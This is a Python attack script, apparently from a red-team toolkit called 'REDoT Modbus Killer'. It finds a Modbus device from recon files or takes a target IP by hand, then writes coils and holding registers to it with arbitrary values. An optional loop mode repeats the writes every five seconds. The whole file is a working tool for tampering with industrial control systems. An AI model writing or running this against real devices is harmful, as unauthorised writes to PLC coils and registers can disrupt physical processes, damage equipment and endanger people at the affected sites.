
#!/usr/bin/env python3
# REDoT Modbus Killer - OT Coil & Register Manipulation

from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import os, time, json, argparse, random

AGENT_ID = "modbus_killer"
ALERT_FILE = "webgui/alerts.json"
RECON_PATHS = [
    "recon/modbus_targets.json",  # Preferred
    "recon/wifi_scan.json",
    "recon/ble_scan.json"
]

def log(msg):
    print(f"[MODBUS] {msg}")

def push_alert(message):
    os.makedirs(os.path.dirname(ALERT_FILE), exist_ok=True)
    alert = {
        "agent": AGENT_ID,
        "alert": message,
        "type": "ot_attack",
        "timestamp": time.time()
    }
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps(alert) + "\n")

def discover_target_ip():
    for path in RECON_PATHS:
        if not os.path.exists(path):
            continue
        try:
            with open(path) as f:
                data = json.load(f)
                for device in data.get("devices", []):
                    if "modbus" in device.get("services", []) or device.get("protocol") == "modbus":
                        return device["ip"]
        except Exception:
            continue
    return None

def modbus_payload(ip):
    try:
        client = ModbusTcpClient(ip)
        if not client.connect():
            log(f"Could not connect to {ip}")
            push_alert(f"Connection failed to Modbus target {ip}")
            return

        log(f"Connected to Modbus device at {ip}")
        push_alert(f"Injecting Modbus commands to {ip}")

        client.write_coil(0, True)
        client.write_register(1, 1337)
        client.write_register(2, random.randint(2000, 6000))
        log("Payload sent")
        client.close()
    except ModbusIOException as e:
        log(f"Modbus exception: {e}")
        push_alert(f"Modbus error: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="Inject Modbus kill payloads")
    parser.add_argument("--target", help="Manual IP of Modbus device")
    parser.add_argument("--loop", action="store_true", help="Continuously repeat attack")
    args = parser.parse_args()

    ip = args.target or discover_target_ip()
    if not ip:
        log("❌ No Modbus target found via scan. Use --target <IP> manually.")
        return

    log(f"Targeting {ip}...")
    if args.loop:
        log("Loop mode enabled (5s delay). Ctrl+C to exit.")
        while True:
            modbus_payload(ip)
            time.sleep(5)
    else:
        modbus_payload(ip)

if __name__ == "__main__":
    main()
